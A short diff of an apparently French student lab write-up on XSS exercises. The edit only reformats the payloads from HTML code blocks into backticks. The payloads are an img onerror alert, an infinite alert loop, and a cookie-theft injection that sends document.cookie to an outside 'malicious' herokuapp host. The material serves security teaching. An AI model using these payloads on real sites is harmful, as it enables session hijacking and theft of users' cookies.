@@ -7,7 +7,7 @@ https://xss-csrf-tp.herokuapp.com/level/1?page=%3Cimg%20src=%27dzqjidqi.jpg%27%2
 Level 2
 -
 1 -
-<pre><code><img src='dqd.jpg' onerror= alert('xss') ></img></code></pre> dans title
+`<img src='dqd.jpg' onerror= alert('xss') ></img>` dans title
 <br/>
 2 -
 Le script ne fonctionne ne pas car il a été correctement géré coté serveur.
@@ -16,10 +16,10 @@ Le script ne fonctionne ne pas car il a été correctement géré coté serveur.
 Les données sont récupérés grâce à un appel de l'API Fetch en JavaScript.
 <br/>
 4 -
-<pre><code><img src='zzz.jpg' onerror=while(true)alert('xss') ></img></code></pre>
+`<img src='zzz.jpg' onerror=while(true)alert('xss') ></img>`
 <br/>
 5 -
-<pre><code><img src='zzz.jpg' onerror="var addr = 'https://my-malicious-ws-maisonhaute.herokuapp.com/' + document.cookie; var imgTag = document.createElement('img') ; imgTag.setAttribute('src', addr); document.body.appendChild(imgTag);" ></img></code></pre>
+`<img src='zzz.jpg' onerror="var addr = 'https://my-malicious-ws-maisonhaute.herokuapp.com/' + document.cookie; var imgTag = document.createElement('img') ; imgTag.setAttribute('src', addr); document.body.appendChild(imgTag);" ></img>`
 <br/><br/>
 Level 3
 -
